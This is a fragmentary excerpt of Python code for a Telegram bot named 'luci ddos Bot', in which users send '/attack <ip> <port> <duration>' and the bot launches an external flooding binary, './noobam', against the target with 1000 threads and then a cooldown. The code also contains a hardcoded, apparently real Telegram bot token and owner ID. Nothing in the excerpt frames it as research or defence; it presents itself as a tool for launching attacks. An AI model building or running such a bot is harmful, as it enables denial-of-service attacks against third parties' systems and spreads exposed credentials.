...
owner_id = 6063791789  # Replace with your Telegram user ID
...
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "Welcome to luci ddos Bot!\n"
        "Use /attack <ip> <port> <duration> to start an attack.\n"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    def run_attack():
        ...
        try:
            ...
            full_command = f"./noobam {target} {port} {attack_time} 1000"
            ...
            running = False
            cooldown_time = time.time() + 180  # Set cooldown to 2 minutes
...
def main():
    ...
    bot_token = "7405828235:AAGrp5aL_ltdOZgASTKdwyq5YBOIXi2fjVk"
